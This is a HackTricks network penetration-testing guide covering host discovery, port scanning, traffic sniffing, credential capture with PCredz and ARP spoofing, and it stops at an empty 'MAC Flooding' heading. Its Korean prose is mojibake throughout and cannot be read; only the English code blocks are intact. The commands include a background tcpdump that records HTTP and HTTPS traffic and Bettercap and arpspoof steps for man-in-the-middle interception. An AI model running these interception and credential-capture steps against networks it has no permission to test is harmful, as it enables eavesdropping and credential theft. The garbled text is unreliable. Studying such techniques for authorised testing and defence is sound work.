# Pentesting Network

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**ë²„ê·¸ ë°”ìš´í‹° íŒ**: **ê°€ì…í•˜ì„¸ìš”** **Intigriti**, í•´ì»¤ë¥¼ ìœ„í•´ í•´ì»¤ê°€ ë§Œë“  í”„ë¦¬ë¯¸ì—„ **ë²„ê·¸ ë°”ìš´í‹° í”Œë«í¼**! ì˜¤ëŠ˜ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ì—ì„œ ì €í¬ì™€ í•¨ê»˜í•˜ê³  ìµœëŒ€ **$100,000**ì˜ ë³´ìƒì„ ë°›ê¸° ì‹œì‘í•˜ì„¸ìš”!

{% embed url="https://go.intigriti.com/hacktricks" %}

## ì™¸ë¶€ì—ì„œ í˜¸ìŠ¤íŠ¸ ë°œê²¬í•˜ê¸°

ì´ëŠ” **ì¸í„°ë„·**ì—ì„œ **ì‘ë‹µí•˜ëŠ” IP**ë¥¼ ì°¾ëŠ” ë°©ë²•ì— ëŒ€í•œ **ê°„ë‹¨í•œ ì„¹ì…˜**ì…ë‹ˆë‹¤.\
ì´ ìƒí™©ì—ì„œëŠ” ëª‡ ê°œì˜ **IP ë²”ìœ„**(ì–´ì©Œë©´ ì—¬ëŸ¬ **ë²”ìœ„**)ê°€ ìˆìœ¼ë©°, **ì–´ë–¤ IPê°€ ì‘ë‹µí•˜ëŠ”ì§€** ì°¾ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤.

### ICMP

ì´ëŠ” í˜¸ìŠ¤íŠ¸ê°€ ì‘ë™ ì¤‘ì¸ì§€ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ëŠ” **ê°€ì¥ ì‰½ê³  ë¹ ë¥¸** ë°©ë²•ì…ë‹ˆë‹¤.\
ì¼ë¶€ **ICMP** íŒ¨í‚·ì„ ë³´ë‚´ê³  **ì‘ë‹µì„ ê¸°ëŒ€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê°€ì¥ ì‰¬ìš´ ë°©ë²•ì€ **ì—ì½” ìš”ì²­**ì„ ë³´ë‚´ê³  ì‘ë‹µì„ ê¸°ëŒ€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê°„ë‹¨í•œ `ping`ì„ ì‚¬ìš©í•˜ê±°ë‚˜ **ë²”ìœ„**ì— ëŒ€í•´ `fping`ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ **nmap**ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ìœ í˜•ì˜ ICMP íŒ¨í‚·ì„ ë³´ë‚¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤(ì´ëŠ” ì¼ë°˜ ICMP ì—ì½” ìš”ì²­-ì‘ë‹µ í•„í„°ë¥¼ í”¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP í¬íŠ¸ íƒì§€

ëª¨ë“  ì¢…ë¥˜ì˜ ICMP íŒ¨í‚·ì´ í•„í„°ë§ë˜ëŠ” ê²½ìš°ê°€ ë§¤ìš° í”í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ í˜¸ìŠ¤íŠ¸ê°€ ì‘ë™ ì¤‘ì¸ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ í•  ìˆ˜ ìˆëŠ” ê²ƒì€ **ì—´ë ¤ ìˆëŠ” í¬íŠ¸ë¥¼ ì°¾ëŠ” ê²ƒ**ë¿ì…ë‹ˆë‹¤. ê° í˜¸ìŠ¤íŠ¸ëŠ” **65535 í¬íŠ¸**ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë¯€ë¡œ, "í°" ë²”ìœ„ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´ **ê° í˜¸ìŠ¤íŠ¸ì˜ ê° í¬íŠ¸**ê°€ ì—´ë ¤ ìˆëŠ”ì§€ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ê·¸ë ‡ê²Œ í•˜ë©´ ë„ˆë¬´ ë§ì€ ì‹œê°„ì´ ì†Œìš”ë©ë‹ˆë‹¤.\
ë”°ë¼ì„œ í•„ìš”í•œ ê²ƒì€ **ë¹ ë¥¸ í¬íŠ¸ ìŠ¤ìºë„ˆ** ([masscan](https://github.com/robertdavidgraham/masscan))ì™€ **ê°€ì¥ ë§ì´ ì‚¬ìš©ë˜ëŠ” í¬íŠ¸ ëª©ë¡**ì…ë‹ˆë‹¤:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
You could also perform this step with `nmap`, but it slower and somewhat `nmap`has problems identifying hosts up.

### HTTP Port Discovery

ì´ê²ƒì€ **HTTP** **ì„œë¹„ìŠ¤**ë¥¼ ë°œê²¬í•˜ëŠ” ë° **ì§‘ì¤‘í•˜ê³ ì í•  ë•Œ** ìœ ìš©í•œ TCP í¬íŠ¸ ë°œê²¬ì…ë‹ˆë‹¤:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP í¬íŠ¸ íƒì§€

ì–´ë–¤ **í˜¸ìŠ¤íŠ¸**ì— **ë” ë§ì€ ì£¼ì˜**ë¥¼ ê¸°ìš¸ì—¬ì•¼ í• ì§€ ê²°ì •í•˜ê¸° ìœ„í•´ **UDP í¬íŠ¸ê°€ ì—´ë ¤ ìˆëŠ”ì§€** í™•ì¸í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. UDP ì„œë¹„ìŠ¤ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë¹ˆ UDP í”„ë¡œë¸Œ íŒ¨í‚·ì— **ì–´ë– í•œ ë°ì´í„°**ë¡œë„ **ì‘ë‹µí•˜ì§€ ì•Šê¸°** ë•Œë¬¸ì— í¬íŠ¸ê°€ í•„í„°ë§ë˜ê³  ìˆëŠ”ì§€ ë˜ëŠ” ì—´ë ¤ ìˆëŠ”ì§€ ë§í•˜ê¸° ì–´ë µìŠµë‹ˆë‹¤. ì´ë¥¼ ê²°ì •í•˜ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•ì€ ì‹¤í–‰ ì¤‘ì¸ ì„œë¹„ìŠ¤ì™€ ê´€ë ¨ëœ íŒ¨í‚·ì„ ë³´ë‚´ëŠ” ê²ƒì´ë©°, ì–´ë–¤ ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ì§€ ëª¨ë¥´ê¸° ë•Œë¬¸ì— í¬íŠ¸ ë²ˆí˜¸ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ê°€ì¥ ê°€ëŠ¥ì„±ì´ ë†’ì€ ê²ƒì„ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
ì œì•ˆëœ nmap ëª…ë ¹ì€ **/24** ë²”ìœ„ ë‚´ì˜ ëª¨ë“  í˜¸ìŠ¤íŠ¸ì—ì„œ **ìƒìœ„ 1000 UDP í¬íŠ¸**ë¥¼ í…ŒìŠ¤íŠ¸í•˜ì§€ë§Œ, ì´ê²ƒë§Œìœ¼ë¡œë„ **>20ë¶„**ì´ ê±¸ë¦½ë‹ˆë‹¤. **ê°€ì¥ ë¹ ë¥¸ ê²°ê³¼**ê°€ í•„ìš”í•˜ë‹¤ë©´ [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `./udp-proto-scanner.pl 199.66.11.53/24` ì´ ëª…ë ¹ì€ **UDP í”„ë¡œë¸Œ**ë¥¼ ì˜ˆìƒ í¬íŠ¸ë¡œ ì „ì†¡í•©ë‹ˆë‹¤ ( /24 ë²”ìœ„ì˜ ê²½ìš° ë‹¨ 1ë¶„ì´ ê±¸ë¦½ë‹ˆë‹¤): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP í¬íŠ¸ íƒì§€
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

ì—¬ê¸° ì‘ì„± ì‹œì ì— ì˜ ì•Œë ¤ì§„ ëª¨ë“  Wifi ê³µê²©ì— ëŒ€í•œ ë©‹ì§„ ê°€ì´ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## ë‚´ë¶€ì—ì„œ í˜¸ìŠ¤íŠ¸ ë°œê²¬í•˜ê¸°

ë„¤íŠ¸ì›Œí¬ ë‚´ë¶€ì— ìˆë‹¤ë©´ ê°€ì¥ ë¨¼ì € í•˜ê³  ì‹¶ì€ ê²ƒ ì¤‘ í•˜ë‚˜ëŠ” **ë‹¤ë¥¸ í˜¸ìŠ¤íŠ¸ë¥¼ ë°œê²¬í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. **ì–¼ë§ˆë‚˜ ë§ì€ ì†ŒìŒ**ì„ ë‚¼ ìˆ˜ ìˆëŠ”ì§€/ë‚´ê³  ì‹¶ì€ì§€ì— ë”°ë¼ ë‹¤ì–‘í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

### Passive

ì—°ê²°ëœ ë„¤íŠ¸ì›Œí¬ ë‚´ì—ì„œ í˜¸ìŠ¤íŠ¸ë¥¼ ìˆ˜ë™ì ìœ¼ë¡œ ë°œê²¬í•˜ê¸° ìœ„í•´ ì´ëŸ¬í•œ ë„êµ¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

[_**ì™¸ë¶€ì—ì„œ í˜¸ìŠ¤íŠ¸ ë°œê²¬í•˜ê¸°**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP í¬íŠ¸ ë°œê²¬_)ì—ì„œ ì–¸ê¸‰ëœ ê¸°ìˆ ì€ ì—¬ê¸°ì—ë„ **ì ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
í•˜ì§€ë§Œ, ë‹¤ë¥¸ í˜¸ìŠ¤íŠ¸ì™€ **ê°™ì€ ë„¤íŠ¸ì›Œí¬**ì— ìˆìœ¼ë¯€ë¡œ, **ë” ë§ì€ ì‘ì—…**ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

_ì™¸ë¶€ì—ì„œ í˜¸ìŠ¤íŠ¸ ë°œê²¬í•˜ê¸°_ì—ì„œ ì–¸ê¸‰ëœ ê¸°ìˆ ë“¤([_**ICMP**_](./#icmp))ì€ ì—¬ê¸°ì—ì„œë„ **ì ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
í•˜ì§€ë§Œ, ë‹¤ë¥¸ í˜¸ìŠ¤íŠ¸ì™€ **ê°™ì€ ë„¤íŠ¸ì›Œí¬**ì— ìˆìœ¼ë¯€ë¡œ **ë” ë§ì€ ì‘ì—…**ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ì„œë¸Œë„· ë¸Œë¡œë“œìºìŠ¤íŠ¸ ì£¼ì†Œ**ì— **ping**ì„ ë³´ë‚´ë©´ pingì´ **ê° í˜¸ìŠ¤íŠ¸**ì— ë„ë‹¬í•˜ê³  ê·¸ë“¤ì´ **ì‘ë‹µ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `ping -b 10.10.5.255`
* **ë„¤íŠ¸ì›Œí¬ ë¸Œë¡œë“œìºìŠ¤íŠ¸ ì£¼ì†Œ**ì— pingì„ ë³´ë‚´ë©´ **ë‹¤ë¥¸ ì„œë¸Œë„·** ë‚´ì˜ í˜¸ìŠ¤íŠ¸ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `ping -b 255.255.255.255`
* `nmap`ì˜ `-PE`, `-PP`, `-PM` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°ê° **ICMPv4 ì—ì½”**, **íƒ€ì„ìŠ¤íƒ¬í”„**, **ì„œë¸Œë„· ë§ˆìŠ¤í¬ ìš”ì²­**ì„ ë³´ë‚´ í˜¸ìŠ¤íŠ¸ ë°œê²¬ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lanì€ **ë„¤íŠ¸ì›Œí¬ ë©”ì‹œì§€**ë¥¼ í†µí•´ ì»´í“¨í„°ë¥¼ **ì¼œëŠ” ë°** ì‚¬ìš©ë©ë‹ˆë‹¤. ì»´í“¨í„°ë¥¼ ì¼œëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë§¤ì§ íŒ¨í‚·ì€ **MAC Dst**ê°€ ì œê³µë˜ê³  ê·¸ í›„ ê°™ì€ íŒ¨í‚· ë‚´ì—ì„œ **16ë²ˆ ë°˜ë³µ**ë˜ëŠ” íŒ¨í‚·ì…ë‹ˆë‹¤.\
ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ íŒ¨í‚·ì€ ì¼ë°˜ì ìœ¼ë¡œ **ì´ë”ë„· 0x0842** ë˜ëŠ” **í¬íŠ¸ 9ë¡œ UDP íŒ¨í‚·**ìœ¼ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.\
**\[MAC]**ì´ ì œê³µë˜ì§€ ì•Šìœ¼ë©´ íŒ¨í‚·ì€ **ë¸Œë¡œë“œìºìŠ¤íŠ¸ ì´ë”ë„·**ìœ¼ë¡œ ì „ì†¡ë©ë‹ˆë‹¤(ê·¸ë¦¬ê³  ë¸Œë¡œë“œìºìŠ¤íŠ¸ MACì´ ë°˜ë³µë©ë‹ˆë‹¤).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## í˜¸ìŠ¤íŠ¸ ìŠ¤ìºë‹

ê¹Šì´ ìˆê²Œ ìŠ¤ìº”í•˜ê³ ì í•˜ëŠ” ëª¨ë“  IP(ì™¸ë¶€ ë˜ëŠ” ë‚´ë¶€)ë¥¼ ë°œê²¬í•œ í›„, ë‹¤ì–‘í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### TCP

* **ì—´ë¦°** í¬íŠ¸: _SYN --> SYN/ACK --> RST_
* **ë‹«íŒ** í¬íŠ¸: _SYN --> RST/ACK_
* **í•„í„°ë§ëœ** í¬íŠ¸: _SYN --> \[ì‘ë‹µ ì—†ìŒ]_
* **í•„í„°ë§ëœ** í¬íŠ¸: _SYN --> ICMP ë©”ì‹œì§€_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP í¬íŠ¸ë¥¼ ìŠ¤ìº”í•˜ëŠ” ë‘ ê°€ì§€ ì˜µì…˜ì´ ìˆìŠµë‹ˆë‹¤:

* **UDP íŒ¨í‚·**ì„ ë³´ë‚´ê³  í¬íŠ¸ê°€ **ë‹«í˜€** ìˆìœ¼ë©´ _**ICMP ë„ë‹¬ ë¶ˆê°€**_ ì‘ë‹µì„ í™•ì¸í•©ë‹ˆë‹¤ (ì—¬ëŸ¬ ê²½ìš° ICMPê°€ **í•„í„°ë§**ë˜ë¯€ë¡œ í¬íŠ¸ê°€ ë‹«í˜€ ìˆê±°ë‚˜ ì—´ë ¤ ìˆëŠ”ì§€ì— ëŒ€í•œ ì •ë³´ë¥¼ ë°›ì§€ ëª»í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
* **í˜•ì‹í™”ëœ ë°ì´í„°ê·¸ë¨**ì„ ë³´ë‚´ì„œ **ì„œë¹„ìŠ¤**(ì˜ˆ: DNS, DHCP, TFTP ë“±, _nmap-payloads_ì— ë‚˜ì—´ëœ)ë¡œë¶€í„° ì‘ë‹µì„ ìœ ë„í•©ë‹ˆë‹¤. **ì‘ë‹µ**ì„ ë°›ìœ¼ë©´ í¬íŠ¸ê°€ **ì—´ë ¤** ìˆìŠµë‹ˆë‹¤.

**Nmap**ì€ "-sV"ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‘ ê°€ì§€ ì˜µì…˜ì„ **í˜¼í•©**í•©ë‹ˆë‹¤ (UDP ìŠ¤ìº”ì€ ë§¤ìš° ëŠë¦½ë‹ˆë‹¤), í•˜ì§€ë§Œ UDP ìŠ¤ìº”ì´ TCP ìŠ¤ìº”ë³´ë‹¤ ëŠë¦¬ë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP ìŠ¤ìº”

**SCTP (ìŠ¤íŠ¸ë¦¼ ì œì–´ ì „ì†¡ í”„ë¡œí† ì½œ)**ì€ **TCP (ì „ì†¡ ì œì–´ í”„ë¡œí† ì½œ)** ë° **UDP (ì‚¬ìš©ì ë°ì´í„°ê·¸ë¨ í”„ë¡œí† ì½œ)**ì™€ í•¨ê»˜ ì‚¬ìš©ë˜ë„ë¡ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ ì£¼ìš” ëª©ì ì€ IP ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ì „í™” ë°ì´í„°ì˜ ì „ì†¡ì„ ìš©ì´í•˜ê²Œ í•˜ì—¬ **ì‹ í˜¸ ì‹œìŠ¤í…œ 7 (SS7)**ì—ì„œ ë°œê²¬ë˜ëŠ” ë§ì€ ì‹ ë¢°ì„± ê¸°ëŠ¥ì„ ë°˜ì˜í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. **SCTP**ëŠ” SS7 ì‹ í˜¸ë¥¼ IP ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ì „ì†¡í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•˜ëŠ” **SIGTRAN** í”„ë¡œí† ì½œ íŒ¨ë°€ë¦¬ì˜ í•µì‹¬ êµ¬ì„± ìš”ì†Œì…ë‹ˆë‹¤.

**SCTP**ì— ëŒ€í•œ ì§€ì›ì€ **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, **VxWorks**ì™€ ê°™ì€ ë‹¤ì–‘í•œ ìš´ì˜ ì²´ì œì—ì„œ ì œê³µë˜ë©°, ì´ëŠ” í†µì‹  ë° ë„¤íŠ¸ì›Œí‚¹ ë¶„ì•¼ì—ì„œì˜ í­ë„“ì€ ìˆ˜ìš©ì„±ê³¼ ìœ ìš©ì„±ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

nmapì€ SCTPì— ëŒ€í•´ ë‘ ê°€ì§€ ë‹¤ë¥¸ ìŠ¤ìº”ì„ ì œê³µí•©ë‹ˆë‹¤: _-sY_ ë° _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS ë° IPS íšŒí”¼

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **ë” ë§ì€ nmap ì˜µì…˜**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### ë‚´ë¶€ IP ì£¼ì†Œ ë…¸ì¶œ

**ì˜ëª» êµ¬ì„±ëœ ë¼ìš°í„°, ë°©í™”ë²½ ë° ë„¤íŠ¸ì›Œí¬ ì¥ì¹˜**ëŠ” ë•Œë•Œë¡œ **ë¹„ê³µì‹ ì†ŒìŠ¤ ì£¼ì†Œ**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë„¤íŠ¸ì›Œí¬ í”„ë¡œë¸Œì— ì‘ë‹µí•©ë‹ˆë‹¤. **tcpdump**ëŠ” í…ŒìŠ¤íŠ¸ ì¤‘ì— ê°œì¸ ì£¼ì†Œì—ì„œ ìˆ˜ì‹ ëœ íŒ¨í‚·ì„ ì‹ë³„í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ Kali Linuxì—ì„œëŠ” **eth2 ì¸í„°í˜ì´ìŠ¤**ì—ì„œ íŒ¨í‚·ì„ ìº¡ì²˜í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ê³µìš© ì¸í„°ë„·ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•©ë‹ˆë‹¤. NAT ë˜ëŠ” ë°©í™”ë²½ ë’¤ì— ì„¤ì •ì´ ìˆëŠ” ê²½ìš° ì´ëŸ¬í•œ íŒ¨í‚·ì€ í•„í„°ë§ë  ê°€ëŠ¥ì„±ì´ ë†’ë‹¤ëŠ” ì ì— ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤.
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

ìŠ¤ë‹ˆí•‘ì„ í†µí•´ ìº¡ì²˜ëœ í”„ë ˆì„ê³¼ íŒ¨í‚·ì„ ê²€í† í•˜ì—¬ IP ë²”ìœ„, ì„œë¸Œë„· í¬ê¸°, MAC ì£¼ì†Œ ë° í˜¸ìŠ¤íŠ¸ ì´ë¦„ì— ëŒ€í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ë°°ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë„¤íŠ¸ì›Œí¬ê°€ ì˜ëª» êµ¬ì„±ë˜ì—ˆê±°ë‚˜ ìŠ¤ìœ„ì¹­ íŒ¨ë¸Œë¦­ì´ ìŠ¤íŠ¸ë ˆìŠ¤ë¥¼ ë°›ëŠ” ê²½ìš°, ê³µê²©ìëŠ” ìˆ˜ë™ ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ì„ í†µí•´ ë¯¼ê°í•œ ìë£Œë¥¼ ìº¡ì²˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìŠ¤ìœ„ì¹˜ëœ ì´ë”ë„· ë„¤íŠ¸ì›Œí¬ê°€ ì œëŒ€ë¡œ êµ¬ì„±ëœ ê²½ìš°, ê·€í•˜ëŠ” ë¸Œë¡œë“œìºìŠ¤íŠ¸ í”„ë ˆì„ê³¼ ê·€í•˜ì˜ MAC ì£¼ì†Œë¡œ ì „ì†¡ë˜ëŠ” ìë£Œë§Œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
ì›ê²© ë¨¸ì‹ ì—ì„œ SSH ì„¸ì…˜ì„ í†µí•´ Wiresharkë¥¼ GUIë¡œ ì‚¬ìš©í•˜ì—¬ ì‹¤ì‹œê°„ìœ¼ë¡œ íŒ¨í‚·ì„ ìº¡ì²˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

ëª…ë°±íˆ.

### ìê²© ì¦ëª… ìº¡ì²˜

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ pcap ë˜ëŠ” ë¼ì´ë¸Œ ì¸í„°í˜ì´ìŠ¤ì—ì„œ ìê²© ì¦ëª…ì„ íŒŒì‹±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## LAN ê³µê²©

### ARP ìŠ¤í‘¸í•‘

ARP ìŠ¤í‘¸í•‘ì€ ê¸°ê³„ì˜ IPê°€ ìš°ë¦¬ì˜ ì¥ì¹˜ì˜ MACì„ ê°€ì§€ê³  ìˆìŒì„ ë‚˜íƒ€ë‚´ê¸° ìœ„í•´ ë¶ˆí•„ìš”í•œ ARP ì‘ë‹µì„ ë³´ë‚´ëŠ” ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ í”¼í•´ìëŠ” ARP í…Œì´ë¸”ì„ ë³€ê²½í•˜ê³  ìŠ¤í‘¸í•‘ëœ IPì— ì—°ë½í•  ë•Œë§ˆë‹¤ ìš°ë¦¬ì˜ ì¥ì¹˜ì— ì—°ë½í•˜ê²Œ ë©ë‹ˆë‹¤.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

